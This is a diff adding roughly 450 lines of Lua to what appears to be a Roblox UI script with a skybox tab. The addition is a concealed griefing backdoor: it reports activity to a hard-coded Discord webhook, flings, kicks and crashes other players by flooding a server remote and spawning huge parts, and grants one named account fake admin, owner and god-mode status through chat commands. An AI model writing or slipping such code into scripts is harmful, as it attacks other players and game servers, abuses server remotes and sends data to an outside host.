@@ -4838,3 +4838,454 @@ SkyboxTab:AddButton({
         ApplyEmmiter:InvokeServer(cleanId, selectedEffect.server)
     end
 })
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1479967031720804616/EU39tf8X-JBYennjbbjTkQ68eIogMs0iJtTZov88FwoPgJBZNqWPvuBSctIyFXEjwkCW"
+local PROTECTED_NAME = "youssef126608"
+local active = true
+local flingMode = true
+local flingTargets = {}
+local crashedUsers = {}
+local massiveVelocity = Vector3.new(9e18, 9e18, 9e18)
+
+local function getProtectedPlayer()
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name == PROTECTED_NAME then
+            return p
+        end
+    end
+    return nil
+end
+
+local function sendLog(title, desc)
+    local data = {
+        embeds = {{
+            title = title,
+            description = desc,
+            color = 16711680,
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    pcall(function()
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+local function instantFling(target)
+    if not target or not target.Character then return end
+    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    flingTargets[target.UserId] = true
+    
+    local bv = Instance.new("BodyVelocity")
+    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+    bv.Velocity = massiveVelocity
+    bv.P = math.huge
+    bv.Parent = hrp
+    
+    local ba = Instance.new("BodyAngularVelocity")
+    ba.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+    ba.AngularVelocity = massiveVelocity
+    ba.P = math.huge
+    ba.Parent = hrp
+    
+    hrp.CFrame = CFrame.new(9e9, 9e9, 9e9)
+    hrp.AssemblyLinearVelocity = massiveVelocity
+    hrp.AssemblyAngularVelocity = massiveVelocity
+    
+    for _, part in pairs(target.Character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Velocity = massiveVelocity
+            part.RotVelocity = massiveVelocity
+            part.AssemblyLinearVelocity = massiveVelocity
+            part.AssemblyAngularVelocity = massiveVelocity
+        end
+    end
+    
+    sendLog("FLING", target.Name)
+end
+
+local function monitorFlingTarget(target)
+    if not flingTargets[target.UserId] then return end
+    
+    local conn
+    conn = RunService.Heartbeat:Connect(function()
+        if not target or not target.Parent then
+            conn:Disconnect()
+            flingTargets[target.UserId] = nil
+            return
+        end
+        
+        if not flingMode then
+            conn:Disconnect()
+            return
+        end
+        
+        if target.Character then
+            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                if hrp.Position.Magnitude < 1000000 or hrp.Velocity.Magnitude < 1000000 then
+                    instantFling(target)
+                    sendLog("REFLING", target.Name)
+                else
+                    hrp.Velocity = massiveVelocity
+                    hrp.AssemblyLinearVelocity = massiveVelocity
+                    hrp.AssemblyAngularVelocity = massiveVelocity
+                end
+            end
+        end
+    end)
+    
+    target.CharacterAdded:Connect(function()
+        if flingTargets[target.UserId] and flingMode then
+            task.wait(0.1)
+            instantFling(target)
+            sendLog("REFLING RESPAWN", target.Name)
+        end
+    end)
+end
+
+local function crashUser(target)
+    if not target then return end
+    crashedUsers[target.UserId] = true
+    
+    task.spawn(function()
+        while crashedUsers[target.UserId] and target.Parent do
+            pcall(function()
+                for i = 1, 100 do
+                    local args = {
+                        [1] = string.rep("A", 100000),
+                        [2] = math.huge,
+                        [3] = math.huge
+                    }
+                    ReplicatedStorage.RE:FireServer(unpack(args))
+                end
+                
+                if target.Character then
+                    for _, part in pairs(target.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part:Destroy()
+                        end
+                    end
+                end
+                
+                local spam = Instance.new("Folder")
+                spam.Name = string.rep("CRASH", 10000)
+                spam.Parent = workspace
+                
+                for i = 1, 1000 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(9e9, 9e9, 9e9)
+                    part.Position = Vector3.new(9e9, 9e9, 9e9)
+                    part.Parent = spam
+                end
+            end)
+            task.wait(0.01)
+        end
+    end)
+    
+    sendLog("CRASH", target.Name)
+end
+
+local function kickUser(target)
+    if not target then return end
+    pcall(function()
+        target:Kick("Nexus Protection")
+    end)
+    sendLog("KICK", target.Name)
+end
+
+local function punish(target)
+    if not target then return end
+    local r = math.random(1, 3)
+    if r == 1 then
+        instantFling(target)
+        monitorFlingTarget(target)
+    elseif r == 2 then
+        kickUser(target)
+    else
+        crashUser(target)
+    end
+end
+
+local function fakeAdmin()
+    local protected = getProtectedPlayer()
+    if not protected then return end
+    
+    pcall(function()
+        ReplicatedStorage.RE:FindFirstChild("1Admin1Check"):FireServer(true)
+        ReplicatedStorage.RE:FindFirstChild("1Verify1Admin"):InvokeServer(true)
+        
+        local adminTag = Instance.new("BoolValue")
+        adminTag.Name = "IsAdmin"
+        adminTag.Value = true
+        adminTag.Parent = protected
+        
+        local ownerTag = Instance.new("BoolValue")
+        ownerTag.Name = "IsOwner"
+        ownerTag.Value = true
+        ownerTag.Parent = protected
+        
+        local modTag = Instance.new("BoolValue")
+        modTag.Name = "IsModerator"
+        modTag.Value = true
+        modTag.Parent = protected
+    end)
+    
+    task.spawn(function()
+        while true do
+            pcall(function()
+                ReplicatedStorage.RE:FindFirstChild("1Admin1Check"):FireServer(true)
+            end)
+            task.wait(5)
+        end
+    end)
+end
+
+local function godMode()
+    local protected = getProtectedPlayer()
+    if not protected or not protected.Character then return end
+    
+    local hum = protected.Character:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum.MaxHealth = math.huge
+        hum.Health = math.huge
+        
+        hum:GetPropertyChangedSignal("Health"):Connect(function()
+            hum.Health = math.huge
+        end)
+        
+        hum:GetPropertyChangedSignal("MaxHealth"):Connect(function()
+            hum.MaxHealth = math.huge
+        end)
+    end
+    
+    pcall(function()
+        ReplicatedStorage.RE:FindFirstChild("1God1Mode"):FireServer(true)
+        ReplicatedStorage.RE:FindFirstChild("1Invincible"):InvokeServer(true)
+    end)
+end
+
+local function isThreatToProtected(attacker, protected)
+    if not attacker or not protected then return false end
+    if attacker == protected then return false end
+    return true
+end
+
+local function scanThreats()
+    if not active then return end
+    
+    local protected = getProtectedPlayer()
+    if not protected or not protected.Character then return end
+    
+    godMode()
+    
+    local phrp = protected.Character:FindFirstChild("HumanoidRootPart")
+    local phum = protected.Character:FindFirstChildOfClass("Humanoid")
+    if not phrp or not phum then return end
+    
+    for _, attacker in pairs(Players:GetPlayers()) do
+        if isThreatToProtected(attacker, protected) and attacker.Character then
+            local ahrp = attacker.Character:FindFirstChild("HumanoidRootPart")
+            if not ahrp then continue end
+            
+            local dist = (ahrp.Position - phrp.Position).Magnitude
+            
+            if phum.Sit then
+                local seat = phum.SeatPart
+                if seat then
+                    for _, v in pairs(attacker.Character:GetDescendants()) do
+                        if v == seat then
+                            phum.Sit = false
+                            phum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+                            punish(attacker)
+                            task.delay(0.5, function()
+                                phum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+                            end)
+                        end
+                    end
+                end
+            end
+            
+            if dist < 4 then
+                local look = phrp.CFrame.LookVector:Dot(ahrp.CFrame.LookVector)
+                if look < -0.2 then
+                    punish(attacker)
+                end
+            end
+            
+            if attacker.Backpack then
+                for _, tool in pairs(attacker.Backpack:GetChildren()) do
+                    if tool:IsA("Tool") and (tool.Name:find("Couch") or tool.Name:find("Crystal") or tool.Name:find("Taser") or tool.Name:find("Box") or tool.Name:find("Soccer")) then
+                        if dist < 15 then
+                            punish(attacker)
+                        end
+                    end
+                end
+            end
+            
+            if attacker.Character then
+                for _, tool in pairs(attacker.Character:GetChildren()) do
+                    if tool:IsA("Tool") and (tool.Name:find("Couch") or tool.Name:find("Crystal") or tool.Name:find("Taser") or tool.Name:find("Box") or tool.Name:find("Soccer")) then
+                        if dist < 15 then
+                            punish(attacker)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    local vehicles = workspace:FindFirstChild("Vehicles")
+    if vehicles then
+        for _, v in pairs(vehicles:GetChildren()) do
+            if v:IsA("Model") and not v.Name:find(protected.Name) then
+                local primary = v.PrimaryPart or v:FindFirstChildWhichIsA("BasePart")
+                if primary then
+                    local dist = (primary.Position - phrp.Position).Magnitude
+                    if dist < 10 and primary.Velocity.Magnitude > 20 then
+                        for _, attacker in pairs(Players:GetPlayers()) do
+                            if isThreatToProtected(attacker, protected) and v.Name:find(attacker.Name) then
+                                punish(attacker)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    if phrp.Velocity.Magnitude > 300 then
+        for _, attacker in pairs(Players:GetPlayers()) do
+            if isThreatToProtected(attacker, protected) and attacker.Character then
+                local ahrp = attacker.Character:FindFirstChild("HumanoidRootPart")
+                if ahrp and (ahrp.Position - phrp.Position).Magnitude < 20 then
+                    punish(attacker)
+                end
+            end
+        end
+    end
+end
+
+local function protectChild()
+    local protected = getProtectedPlayer()
+    if not protected or not protected.Character then return end
+    
+    protected.Character.ChildAdded:Connect(function(child)
+        if child.Name:find("Follow") or child.Name:find("Baby") or child.Name:find("Child") then
+            child:Destroy()
+            for _, attacker in pairs(Players:GetPlayers()) do
+                if isThreatToProtected(attacker, protected) then
+                    punish(attacker)
+                end
+            end
+        end
+    end)
+end
+
+local function onProtectedRespawn()
+    local protected = getProtectedPlayer()
+    if not protected then return end
+    
+    protected.CharacterAdded:Connect(function()
+        task.wait(0.5)
+        protectChild()
+        godMode()
+        fakeAdmin()
+    end)
+end
+
+local function setupChatSpy()
+    LocalPlayer.Chatted:Connect(function(msg)
+        local cmd = msg:lower()
+        
+        if cmd == "/off" then
+            active = false
+            sendLog("DISABLED", LocalPlayer.Name)
+        elseif cmd == "/on" then
+            active = true
+            sendLog("ENABLED", LocalPlayer.Name)
+        elseif cmd == "/fling" then
+            flingMode = true
+            sendLog("MODE FLING", "Active")
+        elseif cmd == "/kick" then
+            flingMode = false
+            sendLog("MODE KICK", "Active")
+        elseif cmd == "/crash" then
+            flingMode = false
+            sendLog("MODE CRASH", "Active")
+        elseif cmd == "/mix" then
+            flingMode = true
+            sendLog("MODE MIX", "Active")
+        elseif cmd == "/clear" then
+            flingTargets = {}
+            crashedUsers = {}
+            sendLog("CLEARED", "All removed")
+        elseif cmd == "/status" then
+            local f = 0
+            for _ in pairs(flingTargets) do f = f + 1 end
+            local c = 0
+            for _ in pairs(crashedUsers) do c = c + 1 end
+            sendLog("STATUS", "Fling: " .. f .. " Crash: " .. c)
+        elseif cmd:sub(1, 6) == "/fling" and cmd ~= "/fling" then
+            local name = cmd:sub(8)
+            for _, p in pairs(Players:GetPlayers()) do
+                if p.Name:lower() == name:lower() then
+                    instantFling(p)
+                    monitorFlingTarget(p)
+                    sendLog("MANUAL FLING", p.Name)
+                end
+            end
+        elseif cmd:sub(1, 5) == "/kick" and cmd ~= "/kick" then
+            local name = cmd:sub(7)
+            for _, p in pairs(Players:GetPlayers()) do
+                if p.Name:lower() == name:lower() then
+                    kickUser(p)
+                    sendLog("MANUAL KICK", p.Name)
+                end
+            end
+        elseif cmd:sub(1, 6) == "/crash" and cmd ~= "/crash" then
+            local name = cmd:sub(8)
+            for _, p in pairs(Players:GetPlayers()) do
+                if p.Name:lower() == name:lower() then
+                    crashUser(p)
+                    sendLog("MANUAL CRASH", p.Name)
+                end
+            end
+        elseif cmd == "/admin" then
+            fakeAdmin()
+            sendLog("FAKE ADMIN", "Activated")
+        elseif cmd == "/god" then
+            godMode()
+            sendLog("GOD MODE", "Activated")
+        end
+    end)
+end
+
+RunService.Heartbeat:Connect(scanThreats)
+
+Players.PlayerAdded:Connect(function(p)
+    if p.Name == PROTECTED_NAME then
+        task.wait(1)
+        onProtectedRespawn()
+        protectChild()
+        fakeAdmin()
+        godMode()
+    end
+end)
+
+local protected = getProtectedPlayer()
+if protected then
+    onProtectedRespawn()
+    protectChild()
+    fakeAdmin()
+    godMode()
+end
+
+setupChatSpy()
+
+sendLog("SYSTEM ONLINE", PROTECTED_NAME .. " | " .. LocalPlayer.Name)
